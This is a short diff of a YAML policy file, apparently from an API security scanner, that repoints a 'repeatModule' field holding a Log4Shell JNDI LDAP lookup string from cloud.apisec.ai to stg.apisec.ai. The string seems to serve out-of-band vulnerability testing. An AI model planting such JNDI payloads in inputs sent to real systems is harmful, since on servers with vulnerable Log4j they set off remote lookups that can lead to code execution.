@@ -72,7 +72,7 @@ policies:
   timeoutSeconds: 300
   repeatOnFailure: 0
   repeat: 0
-  repeatModule: ${jndi:ldap://cloud.apisec.ai:4389/{{@LocalVariable.uuid}}}
+  repeatModule: ${jndi:ldap://stg.apisec.ai:4389/{{@LocalVariable.uuid}}}
   repeatDelay: 0
   unmaskToken: false
   postExecutionDelay: 0
